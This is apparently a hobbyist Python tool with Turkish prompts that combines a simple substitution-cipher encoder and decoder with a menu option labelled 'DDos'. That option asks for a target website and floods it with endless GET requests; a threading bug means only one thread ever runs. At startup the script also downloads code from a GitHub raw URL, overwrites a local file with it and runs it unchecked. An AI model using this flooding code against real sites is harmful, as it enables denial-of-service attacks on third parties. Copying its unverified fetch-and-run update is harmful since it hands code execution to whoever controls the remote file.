from colorama import Fore
import colorama
import os
import pyperclip
import requests
from tqdm import tqdm
import sys, time, random
import threading
 
colorama.init()




banner = f"""{Fore.LIGHTYELLOW_EX}

 █████╗ ███╗   ██╗████████╗██╗       ██████╗
██╔══██╗████╗  ██║╚══██╔══╝██║      ██╔════╝
███████║██╔██╗ ██║   ██║   ██║█████╗██║     
██╔══██║██║╚██╗██║   ██║   ██║╚════╝██║     
██║  ██║██║ ╚████║   ██║   ██║      ╚██████╗
╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝   ╚═╝       ╚═════╝
                    {Fore.CYAN}[+]Coded By ConeDLL

                    
"""



def print_slow(str):
    for letter in str:
        sys.stdout.write(letter)
        sys.stdout.flush()
        time.sleep(0.05)

# Güncelleme bayrağı
update_done = False

version_link = 'https://raw.githubusercontent.com/ConeDll/apipy/main/sonsurum.py'
r = requests.get(version_link)
response_version = r.text.splitlines()  # İndirilen veriyi satır satır ayırın

with open('alfabe.py', 'r', encoding='utf-8') as g:
    veri = g.read()

if response_version != veri.splitlines():
    with open('alfabe.py', 'w', encoding='utf-8') as f:
        f.writelines([line + '\n' for line in response_version])
        f.close()
    print(Fore.YELLOW)
    for i in tqdm(range(101), desc='Güncelleniyor', ascii=False, ncols=75):
        time.sleep(0.01)
    print(Fore.WHITE)
    print_slow(Fore.GREEN + 'Güncelleme Tamamlandı')
    print_slow(Fore.CYAN + '\nSistem Yeniden Başlatılıyor...\n')
    os.system('cls')
    os.system('python alfabe.py')



    
    # Güncelleme tamamlandı, bayrağı ayarlayın
    update_done = True

if not update_done:

    print(banner)




    print(Fore.LIGHTMAGENTA_EX)








    choose = input('Lütfen İşleminizi Seçin\n1-DDos\n2-Alfabe\nSeçimin: ')
    print(Fore.WHITE)
if choose == '2':
    
    alfabe = {
        'a': '3K',
        'b': '1Mü',
        'c': 'ZKş',
        'ç': '=Kö',
        'd': 'MM-ç',
        'e': '8ıl',
        'f': '10xg',
        'g': 'mxaf',
        'ğ': '#Lh',
        'h': 'ZjA',
        'ı': 'l@yl',
        'i': 'ay@b',
        'j': 'gnl@',
        'k': 'zn',
        'l': '4k',
        'm': 'z/r',
        'n': '--aq',
        'o': 'xcazo',
        'ö': 'rt',
        'p': 'hll',
        'r': '1vz',
        's': 'xcw',
        'ş': 'kxk',
        't': 'y3QX',
        'u': 'zA==',
        'ü': 'mtaa',
        'v': 'hj8ü',
        'y': 'Ssc',
        'z': 'ekkk',
        '0': 'kma+',
        '1': 'UK--',
        '2': 'XC==',
        '3': 'zxa!',
        '4': 'xs+f-*',
        '5': 'e4mk',
        '6': '19M',
        '7': 'z-1d',
        '8': 'hmloo',
        '9': 'pcv',
        '-': 'w@M_',
        '+': 'DDLL-_',
        '/': ':&',
        '*': 'zxGk8',
        '.': 'UM0k',
        ',': 'zÇş',
        '@': 'zscaS',
        '#': 'eteta',
        '"': 'dsaasd',
        '|': '452',
        '!': 'ccc',
        '<': 'KK)m',
        '>': 'Zxd',
        '=': 'ASD00',
        '(': '3M1500S',
        ')': 'gvt',
        '{': 'NMUER',
        '}': 'zdf',
        '[': 'kmma',
        ']': 'no12',
    }

    def sifrele(mesaj, alfabe):
        sifreli_mesaj = ''
        for harf in mesaj:
            if harf in alfabe:
                sifreli_mesaj += alfabe[harf]
            else:
                sifreli_mesaj += harf
        return sifreli_mesaj

    def coz(mesaj, alfabe):
        orijinal_mesaj = ''
        i = 0
        while i < len(mesaj):
            found = False
            for harf, kod in alfabe.items():
                if mesaj[i:i + len(kod)] == kod:
                    orijinal_mesaj += harf
                    i += len(kod)
                    found = True
                    break
            if not found:
                orijinal_mesaj += mesaj[i]
                i += 1
        return orijinal_mesaj

    while True:
        secim = input(f"{Fore.YELLOW}Ne yapmak istersiniz?{Fore.WHITE}\n\n\n\n1- Metni kodla\n2 - Metni çöz\n3 - Temizle\n4 - Çıkış\nSeçiminiz: ")

        if secim == '1':
            mesaj = input("Metni girin: ")
            sifreli_metin = sifrele(mesaj, alfabe)
            print("Şifrelenmiş Metin:", Fore.LIGHTCYAN_EX + sifreli_metin + Fore.WHITE)
            pyperclip.copy(sifreli_metin)
        elif secim == '2':
            mesaj = input("Şifrelenmiş metni girin: ")
            orijinal_metin = coz(mesaj, alfabe)
            print("Orijinal Metin:"+ Fore.LIGHTCYAN_EX + orijinal_metin+ Fore.WHITE)
        elif secim == '3':
            os.system('cls' if os.name == 'nt' else 'clear')
        elif secim == '4':
            exit()
        else:
            print("Geçersiz seçenek!")


if choose == '1':
    
    site = input(Fore.LIGHTYELLOW_EX+'Hedef Siteyi Giriniz (Örnek: https://hedefsite.com): '+Fore.WHITE)
    def atak():
        try:
            while True:

                requests.get(site)
                requests.get(site)
                requests.get(site)
                requests.get(site)
                requests.get(site)
                requests.get(site)
                requests.get(site)
                
                print(Fore.GREEN+'200')
        except:
            print(Fore.RED+'Bir Hata oluştu'+Fore.WHITE)

    for i in range(40):
        threading.Thread(target=atak())
